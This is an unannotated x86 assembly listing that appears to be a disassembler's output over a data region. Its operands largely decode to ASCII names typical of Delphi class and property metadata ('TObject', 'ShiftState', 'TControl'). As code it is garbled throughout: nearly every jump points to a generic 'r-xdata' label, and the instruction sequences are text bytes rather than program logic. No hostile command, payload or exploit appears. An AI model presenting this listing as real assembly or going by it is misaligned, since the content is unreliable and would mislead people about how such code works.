pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc ebp
add [ eax ] al
adc [ eax ] al
nop
pushad
or eax [ ebp ]
push esp
adc [ eax ] al
push esp
adc [ eax ] al
adc [ edi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
je r-xdata
jb r-xdata
add [ eax + 0x8004501 ] dh
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
push eax
or al [ ebp ]
or [ ecx ] cl
push esp
dec ebx
jns r-xdata
inc eax
add [ edi + ebx * 2 + 0x41 ] ch
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0xa500040 ] cl
inc ebp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
or al 0x45
or al 0x45
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
mov al 0x1
inc ebp
add [ eax ] cl
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
fmul [ edx ]
inc ebp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x74007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0xad80040 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
je r-xdata
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
je r-xdata
je r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
int3
inc eax
add [ eax + 0x4 ] dl
inc ebp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0xccc0040 ] cl
inc ebp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc eax
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ esp + ecx + 0x45 ] ah
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
inc eax
ror [ ebx ] 0x45
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
inc eax
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0xbc00040 ] cl
inc ebp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
popad
outsb
add [ ecx + edx + 0x40 ] dh
jb r-xdata
jbe r-xdata
inc ebp
popad
outsb
je r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
je r-xdata
outsb
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc ebx
jpe r-xdata
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
mov ah 0x13
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
mov al [ 0x800450e ]
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
add [ eax ] al
adc [ eax ] al
nop
pop esp
or eax 0xc080045
push esp
add [ eax + 0x4 ] dl
inc ebp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] dl
pop es
inc ebp
inc eax
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
push eax
add al 0x45
add [ esi + ecx ] dl
inc ebp
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x451028c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ ebx + edx + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x450ea0c0 ] cl
add [ eax ] cl
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx + 0x40 ] dh
add [ ebx + edx + 0x1b8c0045 ] dh
inc ebp
add [ eax ] al
adc [ eax ] al
enter 0x450d 0x0
or [ edi ] cl
push esp
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
sub [ eax ] dl
inc ebp
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
mov al [ 0x800450f ]
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
adc [ ebp ] eax
stosb [ edi ]
adc eax [ ebp ]
pop esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
je r-xdata
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ eax + 0x3400454e ] cl
pop eax
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ eax ] al
insb
je r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
add [ ebx + 0x450fa0c0 ] cl
add [ eax ] cl
inc eax
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax ] al
in al 0x10
inc eax
add [ ecx + eax ] dl
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add ah cl
insb
inc ebp
add [ eax + 0x2000457d ] cl
pop edi
inc ebp
add [ edi + ebx * 2 + 0x50080045 ] dl
inc ebp
add [ edi + ebx * 2 + 0x45 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add [ eax ] 0x0
add ah ah
adc [ eax ] al
push esp
add [ eax ] eax
add [ edi * 2 + 0x581c0045 ] al
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ebx + ecx * 2 + 0x45 ] cl
add al dl
imul eax [ ebp ] sub_4569cc
pushfd
push 0x45
add [ eax - 0x2bffbab3 ] dl
push esp
inc ebp
add [ eax ] bh
push esp
inc ebp
add [ eax + 0x5d ] ah
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
pop esp
pop ss
inc edx
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ eax + 0x6e ] ah
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
jo r-xdata
add [ esp + esi * 2 + 0x41 ] ch
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ edi + ebx * 2 + 0x41 ] ch
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
adc [ edi ] cl
inc ebp
add [ eax ] cl
lea eax [ eax ]
inc eax
adc [ ebp ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
jbe r-xdata
add [ eax ] eax
add [ edx + 0x5c004513 ] ch
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ edi + ebx * 2 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
pushfd
adc [ ebp ] al
or [ edx ] dl
push esp
inc ebx
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ esp + ecx * 2 ] ah
inc ebp
add [ eax + 0x7b ] al
inc ebp
add [ eax ] bh
outsd
inc ebp
add al bl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_45039f
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
inc ebp
add [ ebx + esi ] bh
inc ebp
add [ eax - 0x4bffbad1 ] dh
inc ebp
add ah dh
xor [ ebp ] eax
js r-xdata
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 2 + 0x4 ] si
inc ebp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + eax + 0x4 ] si
inc ebp
add [ eax + 0x2 ] ch
inc ebp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebp
add ah cl
das
inc ebp
add al dl
das
inc ebp
add al bl
das
inc ebp
add [ eax + 0x32 ] dl
inc ebp
add [ eax + 0x31 ] ah
inc ebp
add [ eax + 0x14004532 ] bl
xor eax [ ebp ]
sub [ ebx ] dh
inc ebp
add [ eax + 0x33 ] cl
inc ebp
add [ edi ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
add al 0x4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
inc ebp
add [ eax ] dh
add [ eax ] al
fadd [ ecx ]
inc ebp
add [ esp + esi ] dh
inc eax
add [ eax ] bh
xor [ ebp ] al
sub [ eax ] dh
inc ebp
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah al
xor [ ebp ] eax
les esi [ eax ]
add al bl
das
inc ebp
add [ eax + 0x32 ] dl
inc ebp
add [ eax + 0x31 ] ah
inc ebp
add [ eax + 0x14004532 ] bl
xor eax [ ebp ]
sub [ ebx ] dh
inc ebp
add [ eax + 0x33 ] cl
inc ebp
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ebp
add [ esp + esi ] dh
inc eax
inc esp
outsd
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ eax + ebx * 2 + 0x58800042 ] dl
inc edx
add [ ebp + eax * 2 + 0x45 ] cl
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
add [ eax ] bh
xor [ ebp ] al
push eax
xor eax [ ebp ]
dec eax
xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah al
xor [ ebp ] eax
les esi [ eax ]
inc ebp
add [ ebx + esi ] bh
inc ebp
add [ eax - 0x4bffbad1 ] dh
inc ebp
add ah dh
xor [ ebp ] eax
js r-xdata
add [ ebx + 0x4504c8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700045 ] al
add [ eax ] al
mov eax 0x34004503
xor al 0x40
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
add eax 0x45
inc ebp
add ah cl
das
inc ebp
add al dl
das
inc ebp
xor al 0x40
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
xor [ edx ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] ah
inc ebp
inc ebp
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ebp
add [ eax + eax ] ah
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x45069890
add [ ebx ] al
or al 0x54
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add [ eax + 0x7c004547 ] dl
sbb eax [ edx ]
mov al 0x49
inc ebp
add [ eax + 0x5c00421b ] dh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
jae r-xdata
add [ edi + eax + 0x45 ] bl
outsd
insd
popad
je r-xdata
inc ebp
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
add eax 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax ] al
nop
add eax 0xe070045
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
dec edx
inc ebp
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c454840
dec eax
inc ebp
add al ah
push ds
inc edx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
dec eax
xor al 0x40
outsd
insb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
pop es
inc ebp
add [ ebx ] cl
jae r-xdata
xchg esp eax
pop es
inc ebp
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + eax + 0x6d060045 ] dl
add [ eax - 0x4fffbab7 ] dh
sbb eax [ edx ]
pop esp
dec eax
sbb eax [ edx ]
nop
jae r-xdata
dec ebp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
push esp
popad
inc eax
add [ eax ] dl
or [ ebp ] al
push es
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
pop es
inc ebp
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
rcl [ edi + eax ] 0x45
pop es
inc ebp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc edi
inc ebp
add [ ebx + ebx + 0x42 ] bh
add eax 0x316c0045
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
inc ebp
inc esi
add esp eax
pop es
add [ ecx ] ecx
push esp
inc ebp
outsb
je r-xdata
or [ ecx + 0x6b ] ah
inc edx
outsd
je r-xdata
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jbe r-xdata
outsd
insb
jae r-xdata
inc esi
add [ eax ] dl
dec ecx
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ edi + ebx ] bl
inc esi
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ edi + ebx + 0x49f80046 ] bl
inc ebp
add [ edi + ebx + 0x4b0c0046 ] ah
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 + 0x54120045 ] ch
inc ebx
outsd
outsb
je r-xdata
inc edx
add [ eax + ecx * 2 + 0x1ee00045 ] bl
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
and [ eax ] cl
inc ebp
add [ eax ] dl
add [ eax ] al
push eax
inc esi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x45082074
jb r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 + 0x46a80041 ] ch
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
inc ebp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] al
xchg esp eax
push es
inc ebp
add [ esi ] al
insd
push es
inc ebp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebp + 0x6040040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004506 ] al
add [ eax ] al
add [ eax + 0x34004618 ] bl
xor al 0x40
add [ eax + 0x34 ] al
inc eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
je r-xdata
add bh bh
or [ ebp ] al
adc al 0x0
adc [ eax ] al
add bh bh
or [ ebp ] al
imul ebp [ esi + 0x74 ] 0x45088c73
add al bh
inc cx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
add ah al
xchg esp eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ edi + eax * 2 + 0x45 ] bh
add [ esi + eax * 2 + 0x45 ] ch
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
jae r-xdata
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x7bcc08b
inc ebp
add [ eax + 0x74614454 ] al
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ecx ] al
add [ eax ] al
lea eax [ eax ]
pushad
pop es
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
